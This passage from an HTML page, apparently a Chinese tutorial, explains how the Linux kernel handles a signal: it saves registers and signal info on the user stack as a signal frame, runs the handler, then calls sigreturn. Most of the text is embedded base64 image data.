Tng9IWuLx/hhd1HuwNLhZbY+u1aJternfG7gN+k0033/hgMxdXNKbmulDkpX8H+DbPbA29sHVEv0lEDnlFgK2QGYxDiLIdOA39TUrWa7FAPV64yqYXO/ozmEYDvQNgrSZt0rPP+1JiyhjTuXjOmFL2vffir+/P0kFen+7r92efItk2c99s+EDd2sNH9bJH+XiZK6MOB221d2Z6FyOBrDVhBJa0eZ8L5avjL7zs7X7rNF0riQJeDru1jzqyHfDFPU9Loyn3jPu7bdZm45x1JdQRfkN4CSUvkey0ZsdUR3i2qVu8LJL7GbDTEbbT+p0XOkLLJiLtPG/uuSyjDrO2hN8nOlWY9tbH72vEMTemzpV2Pg1srdVapxGV6bNnps0ABh9wYc5alFQmr2OMuvC7Q0cJHQ11atVO62s28c4KNh5hpIg1LnREjOh/o7XxjoswfqPwR6DRAVLamvjvw/7+DKSX8fpvJGvZ+K25cr/z7MjtDiwdXNciIALlIKAXWZYDloKKgAiIgAiIgAiIgAiIgAhULgGtgalc/spdBERABERABERABERABESgHAQkYMoBS0FFQAREQAREQAREQAREQAQql4AETOXyV+4iIAIiIAIiIAIiIAIiIALlICABUw5YCioCIiACIiACIiACIiACIlC5BCRgKpe/chcBERABERABERABERABESgHAQmYcsBSUBEQAREQAREQAREQAREQgcolIAFTufyVuwiIgAiIgAiIgAiIgAiIQDkISMCUA5aCioAIiIAIiIAIiIAIiIAIVC4BCZjK5a/cRUAEREAEREAEREAEREAEykFAAqYcsBRUBERABERABERABERABESgcglIwFQuf+UuAiIgAiIgAiIgAiIgAiJQDgISMOWApaAiIAIiIAIiIAIiIAIiIAKVS0ACpnL5K3cREAEREAEREAEREAEREIFyEJCAKQcsBRUBERABERABERABERABEahcAhIwlctfuYuACIiACIiACIiACIiACJSDwP8DFl4U7KLrdJ4AAAAASUVORK5CYIINCg==\" alt=\"Process of Signal Handlering\"></p>\n<ol>\n<li>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</li>\n<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal     Frame。**需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</li>\n</ol>\n<p><img src=\"data:image/png;base64,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